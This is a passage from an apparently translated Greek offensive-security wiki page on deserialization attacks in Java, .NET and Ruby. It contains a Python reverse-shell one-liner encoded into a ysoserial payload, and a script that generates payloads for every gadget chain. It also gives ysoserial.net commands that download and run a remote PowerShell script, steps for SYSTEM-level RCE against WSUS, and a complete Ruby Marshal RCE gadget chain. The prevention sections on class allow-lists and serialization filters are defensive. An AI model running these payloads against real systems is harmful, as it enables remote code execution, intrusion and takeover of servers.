## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Κατά τη δημιουργία ενός payload για το **java.lang.Runtime.exec()** δεν μπορείτε να χρησιμοποιήσετε ειδικούς χαρακτήρες όπως ">" ή "|" για να ανακατευθύνετε την έξοδο μιας εκτέλεσης, "$()" για να εκτελέσετε εντολές ή ακόμη και να **περάσετε ορίσματα** σε μια εντολή διαχωρισμένα με **κενά** (μπορείτε να κάνετε `echo -n "hello world"` αλλά δεν μπορείτε να κάνετε `python2 -c 'print "Hello world"'`). Για να κωδικοποιήσετε σωστά το payload μπορείτε να [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

Μπορείτε να χρησιμοποιήσετε το παρακάτω script για να δημιουργήσετε **all the possible code execution** payloads για Windows και Linux και στη συνέχεια να τα δοκιμάσετε στην vulnerable web page:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Μπορείτε να **χρησιμοποιήσετε** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **μαζί με το ysoserial για να δημιουργήσετε περισσότερα exploits**. Περισσότερες πληροφορίες για αυτό το εργαλείο στις **διαφάνειες της παρουσίασης** όπου παρουσιάστηκε το εργαλείο: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)μπορεί να χρησιμοποιηθεί για να δημιουργήσει payloads για να exploit διαφορετικές **Json** και **Yml** serialization βιβλιοθήκες σε Java.\
Για να μεταγλωττίσω το project χρειάστηκε να **προσθέσω** αυτές τις **εξαρτήσεις** στο `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Εγκαταστήστε maven**, και **μεταγλωττίστε** το έργο:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Διαβάστε περισσότερα σχετικά με αυτή τη Java JSON βιβλιοθήκη: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Εργαστήρια

- If you want to test some ysoserial payloads you can **τρέξετε αυτή τη webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Γιατί

Η Java χρησιμοποιεί εκτεταμένα serialization για διάφορους σκοπούς όπως:

- **HTTP requests**: Το serialization χρησιμοποιείται ευρέως στη διαχείριση των παραμέτρων, του ViewState, των cookies, κ.λπ.
- **RMI (Remote Method Invocation)**: Το πρωτόκολλο Java RMI, που βασίζεται εξ ολοκλήρου στο serialization, αποτελεί ακρογωνιαίο λίθο για την απομακρυσμένη επικοινωνία σε Java εφαρμογές.
- **RMI over HTTP**: Αυτή η μέθοδος χρησιμοποιείται συνήθως από εφαρμογές web με thick client βασισμένες σε Java, αξιοποιώντας το serialization για όλες τις επικοινωνίες αντικειμένων.
- **JMX (Java Management Extensions)**: Το JMX αξιοποιεί το serialization για μετάδοση αντικειμένων μέσω του δικτύου.
- **Custom Protocols**: Στην Java, η τυπική πρακτική περιλαμβάνει τη μετάδοση raw Java objects, κάτι που θα επιδειχθεί σε επερχόμενα παραδείγματα exploits.

### Πρόληψη

#### Αντικείμενα transient

Μια κλάση που υλοποιεί το `Serializable` μπορεί να δηλώσει ως `transient` οποιοδήποτε αντικείμενο μέσα στην κλάση που δεν θα πρέπει να είναι serializable. Για παράδειγμα:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Αποφυγή σειριοποίησης μιας κλάσης που πρέπει να υλοποιεί το Serializable

Σε σενάρια όπου ορισμένα **αντικείμενα πρέπει να υλοποιούν το `Serializable` interface** λόγω της ιεραρχίας κλάσεων, υπάρχει κίνδυνος μη ακούσιας αποσειριοποίησης. Για να το αποτρέψετε, βεβαιωθείτε ότι αυτά τα αντικείμενα είναι μη-αποσειριοποιήσιμα ορίζοντας μια `final` μέθοδο `readObject()` που πάντα ρίχνει εξαίρεση, όπως φαίνεται παρακάτω:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Ενίσχυση της ασφάλειας της αποσειριοποίησης στην Java**

Η προσαρμογή του `java.io.ObjectInputStream` είναι μια πρακτική μέθοδος για την ασφάλιση της διαδικασίας αποσειριοποίησης. Αυτή η μέθοδος είναι κατάλληλη όταν:

- Ο κώδικας αποσειριοποίησης είναι υπό τον έλεγχό σας.
- Οι κλάσεις που αναμένονται για αποσειριοποίηση είναι γνωστές.

Παρακάμψτε τη μέθοδο **`resolveClass()`** για να περιορίσετε την αποσειριοποίηση μόνο σε επιτρεπόμενες κλάσεις. Αυτό αποτρέπει την αποσειριοποίηση οποιασδήποτε κλάσης εκτός από εκείνες που έχουν ρητώς επιτραπεί, όπως στο ακόλουθο παράδειγμα που περιορίζει την αποσειριοποίηση μόνο στην κλάση `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Χρήση ενός Java Agent για βελτίωση της ασφάλειας** προσφέρει μια εναλλακτική λύση όταν δεν είναι δυνατή η τροποποίηση του κώδικα. Αυτή η μέθοδος εφαρμόζεται κυρίως για **blacklisting harmful classes**, χρησιμοποιώντας παράμετρο JVM:
```
-javaagent:name-of-agent.jar
```
Παρέχει έναν τρόπο για την ασφάλεια της deserialization δυναμικά, ιδανικό για περιβάλλοντα όπου άμεσες αλλαγές στον κώδικα είναι ανέφικτες.

Δείτε ένα παράδειγμα στο [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Εφαρμογή Serialization Filters**: Java 9 εισήγαγε τα serialization filters μέσω του interface **`ObjectInputFilter`**, παρέχοντας έναν ισχυρό μηχανισμό για τον καθορισμό κριτηρίων που πρέπει να πληρούν τα serialized objects πριν από το deserialization. Αυτά τα φίλτρα μπορούν να εφαρμοστούν σε παγκόσμιο επίπεδο ή ανά stream, προσφέροντας λεπτομερή έλεγχο της διαδικασίας deserialization.

Για να χρησιμοποιήσετε τα serialization filters, μπορείτε να ορίσετε ένα global filter που εφαρμόζεται σε όλες τις deserialization operations ή να το ρυθμίσετε δυναμικά για συγκεκριμένα streams. Για παράδειγμα:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Εκμετάλλευση Εξωτερικών Βιβλιοθηκών για Ενισχυμένη Ασφάλεια**: Βιβλιοθήκες όπως οι **NotSoSerial**, **jdeserialize**, και **Kryo** προσφέρουν προηγμένα χαρακτηριστικά για τον έλεγχο και την παρακολούθηση της Java deserialization. Αυτές οι βιβλιοθήκες μπορούν να προσθέσουν επιπλέον επίπεδα ασφάλειας, όπως whitelisting ή blacklisting classes, ανάλυση των serialized objects πριν από τη deserialization, και υλοποίηση custom serialization στρατηγικών.

- **NotSoSerial** παρεμβαίνει στις διαδικασίες deserialization για να αποτρέψει την εκτέλεση untrusted code.
- **jdeserialize** επιτρέπει την ανάλυση serialized Java objects χωρίς να τα deserializes, βοηθώντας στον εντοπισμό πιθανώς malicious περιεχομένου.
- **Kryo** είναι ένα alternative serialization framework που δίνει έμφαση στην ταχύτητα και την αποδοτικότητα, προσφέροντας configurable serialization strategies που μπορούν να ενισχύσουν την ασφάλεια.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Βρείτε τι είναι το **JNDI Injection, πώς να το εκμεταλλευτείτε μέσω RMI, CORBA & LDAP και πώς να εκμεταλλευτείτε το log4shell** (και παράδειγμα αυτής της vuln) στην παρακάτω σελίδα:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

Υπάρχουν αρκετά προϊόντα που χρησιμοποιούν αυτό το middleware για την αποστολή μηνυμάτων:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

Βασικά υπάρχουν **πολλές υπηρεσίες που χρησιμοποιούν JMS με επικίνδυνο τρόπο**. Επομένως, αν έχετε **αρκετά προνόμια** για να στέλνετε μηνύματα σε αυτές τις υπηρεσίες (συνήθως θα χρειαστείτε valid credentials) θα μπορούσατε να στείλετε **malicious objects serialized που θα deserializes από τον consumer/subscriber**.\
Αυτό σημαίνει ότι σε αυτήν την εκμετάλλευση όλοι οι **clients που θα χρησιμοποιήσουν αυτό το μήνυμα θα μολυνθούν**.

Πρέπει να θυμάστε ότι ακόμη και αν μια υπηρεσία είναι vulnerable (επειδή κάνει insecurely deserializing user input) εξακολουθεί να χρειάζεται να βρείτε valid gadgets για να εκμεταλλευτείτε την ευπάθεια.

Το εργαλείο [JMET](https://github.com/matthiaskaiser/jmet) δημιουργήθηκε για να **συνδεθεί και να επιτεθεί σε αυτές τις υπηρεσίες στέλνοντας διάφορα malicious objects serialized χρησιμοποιώντας γνωστά gadgets**. Αυτά τα exploits θα λειτουργήσουν αν η υπηρεσία εξακολουθεί να είναι vulnerable και αν οποιοδήποτε από τα χρησιμοποιούμενα gadgets υπάρχει μέσα στην ευπαθή εφαρμογή.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Στο πλαίσιο του .Net, τα deserialization exploits λειτουργούν με τρόπο παρόμοιο με αυτά της Java, όπου gadgets εκμεταλλεύονται για να τρέξουν συγκεκριμένο κώδικα κατά τη deserialization ενός αντικειμένου.

### Fingerprint

#### WhiteBox

Ο πηγαίος κώδικας πρέπει να ελεγχθεί για εμφανίσεις των:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Η προσοχή πρέπει να επικεντρωθεί σε serializers που επιτρέπουν ο τύπος να προσδιορίζεται από μια μεταβλητή υπό τον έλεγχο του χρήστη.

#### BlackBox

Η αναζήτηση πρέπει να στοχεύει στο Base64 encoded string **AAEAAAD/////** ή σε οποιοδήποτε παρόμοιο pattern που μπορεί να υποστεί deserialization στην πλευρά του server, παρέχοντας τον έλεγχο πάνω στον τύπο που θα deserializes. Αυτό μπορεί να περιλαμβάνει, αλλά δεν περιορίζεται σε, **JSON** ή **XML** δομές που περιέχουν `TypeObject` ή `$type`.

### ysoserial.net

Σε αυτή την περίπτωση μπορείτε να χρησιμοποιήσετε το εργαλείο [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) για να **δημιουργήσετε τα deserialization exploits**. Αφού κατεβάσετε το git repository πρέπει να **compile the tool** χρησιμοποιώντας Visual Studio για παράδειγμα.

Αν θέλετε να μάθετε **πώς το ysoserial.net δημιουργεί το exploit του** μπορείτε να [**ελέγξετε αυτή τη σελίδα όπου εξηγείται το ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

The main options of **ysoserial.net** are: **`--gadget`**, **`--formatter`**, **`--output`** and **`--plugin`.**

- **`--gadget`** used to indicate the gadget to abuse (indicate the class/function that will be abused during deserialization to execute commands).
- **`--formatter`**, used to indicated the method to serialized the exploit (you need to know which library is using the back-end to deserialize the payload and use the same to serialize it)
- **`--output`** used to indicate if you want the exploit in **raw** or **base64** encoded. _Note that **ysoserial.net** will **encode** the payload using **UTF-16LE** (encoding used by default on Windows) so if you get the raw and just encode it from a linux console you might have some **encoding compatibility problems** that will prevent the exploit from working properly (in HTB JSON box the payload worked in both UTF-16LE and ASCII but this doesn't mean it will always work)._
- **`--plugin`** ysoserial.net supports plugins to craft **exploits for specific frameworks** like ViewState

#### More ysoserial.net parameters

- `--minify` will provide a **smaller payload** (if possible)
- `--raf -f Json.Net -c "anything"` This will indicate all the gadgets that can be used with a provided formatter (`Json.Net` in this case)
- `--sf xml` you can **indicate a gadget** (`-g`)and ysoserial.net will search for formatters containing "xml" (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** έχει επίσης μια **πολύ ενδιαφέρουσα παράμετρο** που βοηθά να καταλάβετε καλύτερα πώς λειτουργεί κάθε exploit: `--test`\
Αν δηλώσετε αυτήν την παράμετρο **ysoserial.net** θα **δοκιμάσει** το **exploit τοπικά,** ώστε να μπορείτε να δοκιμάσετε αν το payload σας θα λειτουργήσει σωστά.\
Αυτή η παράμετρος είναι χρήσιμη επειδή αν ελέγξετε τον κώδικα θα βρείτε κομμάτια κώδικα σαν το παρακάτω (από [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Αυτό σημαίνει ότι, για να δοκιμαστεί το exploit, ο κώδικας θα καλέσει [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Ο προηγούμενος κώδικας είναι ευάλωτος στο exploit που δημιουργήθηκε. Έτσι, αν βρείτε κάτι παρόμοιο σε μια .Net εφαρμογή σημαίνει ότι πιθανότατα και αυτή η εφαρμογή είναι ευάλωτη.\
Επομένως η παράμετρος **`--test`** μας επιτρέπει να καταλάβουμε **ποια κομμάτια του κώδικα είναι ευάλωτα** στο deserialization exploit που μπορεί να δημιουργήσει το **ysoserial.net**.

### ViewState

Ρίξτε μια ματιά σε [αυτό το POST σχετικά με **πώς να δοκιμάσετε να εκμεταλλευτείτε την παράμετρο __ViewState του .Net**](exploiting-__viewstate-parameter.md) για **να execute arbitrary code.** Αν **γνωρίζετε ήδη τα secrets** που χρησιμοποιεί η μηχανή θύμα, [**διαβάστε αυτό το post για να μάθετε πώς να execute code**](exploiting-__viewstate-knowing-the-secret.md).

### Πραγματικός sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Επηρεασμένα endpoints:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie αποκρυπτογραφείται και στη συνέχεια deserialized με BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch και σχετικές SOAP ops που φτάνουν σε SoapFormatter sinks; το base64 gadget επεξεργάζεται όταν η WSUS console εισάγει το event.
- Root cause: attacker‑controlled bytes φτάνουν σε legacy .NET formatters (BinaryFormatter/SoapFormatter) χωρίς αυστηρές allow‑lists/binders, οπότε οι gadget chains εκτελούνται ως ο WSUS service account (συχνά SYSTEM).

Minimal exploitation (Reporting path):
1) Generate a .NET gadget with ysoserial.net (BinaryFormatter or SoapFormatter) and output base64, for example:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Συντάξτε SOAP για το `ReportEventBatch` ενσωματώνοντας το base64 gadget και κάντε POST στο `/ReportingWebService.asmx`.
3) Όταν ένας admin ανοίξει την κονσόλα WSUS, το event απο-σειριοποιείται και το gadget εκτελείται (RCE as SYSTEM).

AuthorizationCookie / GetCookie()
- Ένα παραποιημένο AuthorizationCookie μπορεί να γίνει αποδεκτό, να αποκρυπτογραφηθεί και να περαστεί σε BinaryFormatter sink, επιτρέποντας pre‑auth RCE αν είναι προσβάσιμο.

Δημόσιο PoC (tecxx/CVE-2025-59287-WSUS) παράμετροι:
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
Δείτε [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Πρόληψη

Για να μειώσετε τους κινδύνους που σχετίζονται με την αποσειριοποίηση στο .Net:

- **Αποφύγετε να επιτρέπετε σε ροές δεδομένων να ορίζουν τους τύπους αντικειμένων τους.** Χρησιμοποιήστε `DataContractSerializer` ή `XmlSerializer` όπου είναι δυνατόν.
- **Για `JSON.Net`, ορίστε το `TypeNameHandling` σε `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Αποφύγετε τη χρήση του `JavaScriptSerializer` με `JavaScriptTypeResolver`.**
- **Περιορίστε τους τύπους που μπορούν να αποσειριοποιηθούν**, κατανοώντας τους εγγενείς κινδύνους με τύπους .Net, όπως `System.IO.FileInfo`, που μπορεί να τροποποιήσουν ιδιότητες αρχείων του server, οδηγώντας ενδεχομένως σε επιθέσεις άρνησης υπηρεσίας.
- **Να είστε προσεκτικοί με τύπους που έχουν επικίνδυνες ιδιότητες**, όπως `System.ComponentModel.DataAnnotations.ValidationException` με την ιδιότητά του `Value`, η οποία μπορεί να εκμεταλλευθεί.
- **Ελέγξτε με ασφάλεια τη δημιουργία στιγμιότυπων τύπων** για να αποτρέψετε τους επιτιθέμενους από το να επηρεάσουν τη διαδικασία αποσειριοποίησης, καθιστώντας ακόμη και τους `DataContractSerializer` ή `XmlSerializer` ευάλωτους.
- **Εφαρμόστε ελέγχους λευκής λίστας** χρησιμοποιώντας custom `SerializationBinder` για `BinaryFormatter` και `JSON.Net`.
- **Μείνετε ενήμεροι για γνωστά μη ασφαλή deserialization gadgets** στο .Net και διασφαλίστε ότι οι deserializers δεν θα δημιουργούν τέτοιους τύπους.
- **Απομονώστε τον ενδεχομένως επικίνδυνο κώδικα** από κώδικα με πρόσβαση στο internet ώστε να αποφύγετε την έκθεση γνωστών gadgets, όπως `System.Windows.Data.ObjectDataProvider` σε WPF εφαρμογές, σε μη αξιόπιστες πηγές δεδομένων.

### **Αναφορές**

- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ομιλία: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) και διαφάνειες: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Στο Ruby, η σειριοποίηση υλοποιείται από δύο μεθόδους της βιβλιοθήκης **marshal**. Η πρώτη μέθοδος, γνωστή ως **dump**, χρησιμοποιείται για να μετατρέψει ένα αντικείμενο σε ροή bytes. Αυτή η διαδικασία αναφέρεται ως σειριοποίηση. Αντίθετα, η δεύτερη μέθοδος, **load**, χρησιμοποιείται για να μετατρέψει μια ροή bytes πίσω σε ένα αντικείμενο, διαδικασία γνωστή ως αποσειριοποίηση.

Για την ασφάλεια των σειριοποιημένων αντικειμένων, το **Ruby χρησιμοποιεί HMAC (Hash-Based Message Authentication Code)**, εξασφαλίζοντας την ακεραιότητα και την αυθεντικότητα των δεδομένων. Το κλειδί που χρησιμοποιείται για αυτόν τον σκοπό αποθηκεύεται σε ένα από τα εξής μέρη:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (περισσότερες πληροφορίες στο** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**):**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Άλλη αλυσίδα RCE για εκμετάλλευση του Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() μέθοδος

